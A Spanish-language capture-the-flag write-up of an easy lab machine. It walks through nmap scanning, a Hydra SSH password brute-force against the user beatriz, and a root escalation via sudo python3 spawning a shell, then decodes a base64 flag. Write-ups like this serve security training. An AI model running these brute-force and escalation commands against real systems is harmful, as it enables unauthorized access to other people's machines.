---
description: '✍️ Autor: beafn28🔍 Dificultad: Fácil 📅 Fecha de creación: 29/09/2024'
---

# Bienvenidos

### 🔍 RECONOCIMIENTO

En primer lugar, tras conectarnos a la máquina, utilizamos el comando:

```bash
ping -c 1 172.17.0.2
```

para verificar la conectividad de red.

<figure><img src="../.gitbook/assets/imagen (12) (1).png" alt=""><figcaption></figcaption></figure>

A continuación, realizamos el comando:

```bash
nmap -sVC -p- -n --min-rate 5000 172.17.0.2
```

para realizar un escaneo de puertos y servicios detallado en la dirección IP.

<figure><img src="../.gitbook/assets/imagen (13) (1).png" alt=""><figcaption></figcaption></figure>

Como podemos observar durante el escaneo que el **puerto 22** perteneciente al **servicio SSH** y el **puerto 80** perteneciente al **servicio HTTP** están abiertos por lo que a continuación se indagará más.

### 🔎 **EXPLORACIÓN**

Se utiliza el comando:

```bash
sudo nmap -sCV -p22,80 -v 172.17.0.2
```

para obtener más información sobre esos puertos específicamente.

<figure><img src="../.gitbook/assets/imagen (14) (1).png" alt=""><figcaption></figcaption></figure>

Seguimos indagando más sobre los puertos y ahora indagamos sobre el **servicio HTTP**. Se ingresó la **dirección IP** en el navegador lo que llevó a que la página web nos da la bienvenida Beatriz a la plataforma [Root Acces](https://rootacc.es/index.php?sid=585994e8f11ab449e8ccbd8e65e13a59). Descubrimos que **Beatriz** puede ser un usuario y tiene sentido ya que es la que crea los CTF.

<figure><img src="../.gitbook/assets/imagen (55).png" alt=""><figcaption></figcaption></figure>

### 🚀 **EXPLOTACIÓN**

Con la información obtenida anteriormente, realizamos el comando:

```bash
hydra -l beatriz -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 5
```

que utiliza la herramienta **Hydra** para realizar un ataque de fuerza bruta contra el servicio **SSH** de una máquina con la IP **172.17.0.2**.

<figure><img src="../.gitbook/assets/imagen (18).png" alt=""><figcaption></figcaption></figure>

Al realizar el ataque de fuerza bruta, hemos descubierto la contraseña de **beatriz**. Sabiendo esto, nos conectamos a través de **SSH** al usuario con el comando:

```bash
ssh beatriz@172.17.0.2
```

<figure><img src="../.gitbook/assets/imagen (16).png" alt=""><figcaption></figcaption></figure>

### 🔐 **PRIVILEGIOS**

Al estar dentro y ejecutar:

```bash
whoami
```

aún no somos **root**, por lo que hacemos:

```bash
sudo -l
```

para ver si hay algo para explotar.

<figure><img src="../.gitbook/assets/imagen (19).png" alt=""><figcaption></figcaption></figure>

Se ha identificado que podemos ejecutar `/usr/bin/python3` con permisos de `sudo`. Para escalar privilegios, utilizaremos [GTFObins](https://gtfobins.github.io/gtfobins/python/), que proporciona una lista de comandos que se pueden ejecutar utilizando Python.

Esto nos permitirá aprovechar el entorno de Python para ejecutar código que nos ayude a obtener acceso a niveles más altos de privilegio en el sistema.

```bash
sudo python3 -c 'import os; os.system("/bin/sh")'
```

<figure><img src="../.gitbook/assets/imagen (20).png" alt=""><figcaption></figcaption></figure>

Ya somos **root** por lo que ahora encontraremos la bandera en su directorio.

<figure><img src="../.gitbook/assets/imagen (56).png" alt=""><figcaption></figcaption></figure>

Esta bandera está codificada en base64 la decodificamos con este comando:

```bash
echo "aHR0cHM6Ly9yb290YWNjLmVzCg==" | base64 --decode
```

<figure><img src="../.gitbook/assets/imagen (57).png" alt=""><figcaption></figcaption></figure>
